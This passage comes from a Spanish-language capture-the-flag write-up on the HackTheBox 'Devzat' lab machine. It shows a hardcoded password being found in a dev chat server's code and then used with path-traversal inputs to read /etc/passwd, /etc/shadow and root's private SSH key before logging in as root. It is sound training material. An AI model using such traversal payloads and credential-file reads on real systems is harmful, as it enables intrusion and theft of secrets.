‚ù± unzip devzat-dev.zip 
Archive:  devzat-dev.zip
   creating: dev/
  inflating: dev/go.mod
 extracting: dev/.gitignore
  inflating: dev/util.go
  inflating: dev/testfile.txt
  inflating: dev/eastereggs.go
  inflating: dev/README.md
  inflating: dev/games.go
  inflating: dev/colors.go
 extracting: dev/log.txt
  inflating: dev/commands.go
  inflating: dev/start.sh
  inflating: dev/devchat.go
  inflating: dev/LICENSE
  inflating: dev/commandhandler.go
  inflating: dev/art.txt
  inflating: dev/go.sum
 extracting: dev/allusers.json
```

Contiene los mismos objetos que maneja el programa del [chat SSH](https://github.com/quackduck/devzat), recorramos algunos objetos a ver que encontramos...

En el archivo `commands.go` (que como su nombre lo indica, tiene los comandos permitidos en el programa (chat)), encontramos una validaci√≥n de una contrase√±a en texto plano (de la que hablaron en su conversaci√≥n):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_unzip_devFILES_commandsGO_pwYfunction.png" style="width: 100%;"/>

Listooooos! Probando reutilizaci√≥n de contrase√±as no logramos nada.

Algo curioso es el nombre de la funci√≥n, ¬øpero qu√© tiene de curioso?:

* La idea de la funci√≥n es leer archivos del sistema, tomar su contenido y pegarlos en el chat:

  <img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_unzip_devFILES_commandsGO_definitionFunction.png" style="width: 100%;"/>

  **Bastante llamativo, habr√° que ver si esta bien programado (aunque dice "alpha", uhhhh)**

Pues interactuemos con el chat interno y salgamos de dudas (:

```bash
catherine@devzat:~$ ssh catherine@localhost -p 8443
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH_sshChat_catherineWITHpatrick.png" style="width: 100%;"/>

Bien, casi la misma conversaci√≥n, **patrick** le dice que puede probar a hacer un `diff` entre la instancia principal (main) y la de desarrollo (dev), peeero nosotros posiblemente ya notamos el cambio, as√≠ que obviamos eso por ahora yyyyyyy adem√°s tambi√©n le dice que la seguridad es muuuy pobre (:

Juguemos con el comando del archivo:

```bash
cAtherine: /commands
...
[SYSTEM] file - Paste a files content directly to chat [alpha]
cAtherine: /commands
```

Ah√≠ esta la opci√≥n, pues probemos por extraer el contenido del objeto `/etc/passwd` del sistema:

```bash
catherine: /file
[SYSTEM] Please provide file to print and the password
```

```bash
catherine: /file /etc/passwd
[SYSTEM] You need to provide the correct password to use this function
```

```bash
catherine: /file /etc/passwd hola
[SYSTEM] You did provide the wrong password
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH_sshChat_filePASSWDwithPW.png" style="width: 100%;"/>

Uhhhhhh, varias cositas a destacar:

* El programa por default esta leyendo objetos de la carpeta `/root` (para acceder se necesitan permisos de administrador), esto puede significar dos cosas: O el puerto `8443` esta siendo ejecutado por `root` o la funci√≥n que ejecuta `/file` tiene algunos permisos administrativos (las dos opciones son aterradoras en caso de no estar bien sanitizados.
* Al ver la ruta completa se me viene a la mente el probar romper esa cadena y salirnos de las carpetas `/root/devzat` para finalmente llegar a `/etc/passwd`, o mejor dicho hacer una [inclusi√≥n local de archivos (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), que permite ver archivos del sistema a los que realmente no deber√≠amos tener acceso.

Pues rompaaaamos (o intentemos) esa vaina:

```bash
catherine: /file ../etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/etc/passwd does not exist!
```

BIEEEEEEEEN, lo esta haciendo, as√≠ queeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee:

```bash
catherine: /file ../../etc/passwd CeilingCatStillAThingIn2021?
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH_sshChat_filePASSWD_done.png" style="width: 100%;"/>

Listo, logramos el **LFI**, solo nos queda validar si tenemos permiso de leer **cualquier** objeto del sistema, por ejemplo descubramos el archivo que contiene las contrase√±as de los usuarios, `/etc/shadow`:

```bash
catherine: /file ../../etc/shadow CeilingCatStillAThingIn2021?
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH_sshChat_fileSHADOW_done.png" style="width: 100%;"/>

TENEMOS ACCESO A CUALQUIER OBJETO DEL SISTEMAAAAAAAAAAAAAAAAAAAA!! Veamos si `root` tiene llave privada para rob√°rnosla y conectarnos sin proveer contrase√±a:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_catherineSH_sshChat_fileROOTidRSA_done.png" style="width: 100%;"/>

TIENEEEEEEEEEEEEEEEEE! La copiamos, pegamos en un objeto de nuestro sistema, modificamos permisos yyyyyyyyyyyyyyyyyy:

```bash
‚ù± ssh root@devzat.htb -i root.id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389bash_rootSH.png" style="width: 100%;"/>

(: Conseguimos finalmente una Shell como el usuario `root`, veamos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/devzat/389flags.png" style="width: 100%;"/>

Nos juiiimos!

...

Una m√°quina bastante rara con respecto a las explotaciones y el camino hacia `root`, no me disgusto, pero no fue del todo agradable.

Eso s√≠, conoc√≠ una herramienta bastante llamativa, `SSH Chat`.

Nos leeremos despu√©s, y nada, a seguir rompiendo de todoooooooooooo!